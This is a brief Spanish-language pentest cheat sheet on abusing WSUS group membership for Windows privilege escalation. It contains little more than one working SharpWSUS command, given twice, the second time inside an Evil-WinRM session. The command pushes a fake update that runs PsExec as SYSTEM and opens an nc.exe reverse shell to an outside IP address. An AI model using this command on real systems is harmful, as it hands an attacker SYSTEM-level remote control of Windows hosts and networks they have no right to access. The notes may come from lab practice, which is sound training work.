# Groups

## Abuso del grupo WSUS
```null
PS C:\Windows\Temp\Privesc> .\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
```

## Rerverse shell con Psexec

```null
*Evil-WinRM* PS C:\Windows\Temp\Privesc> .\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
```

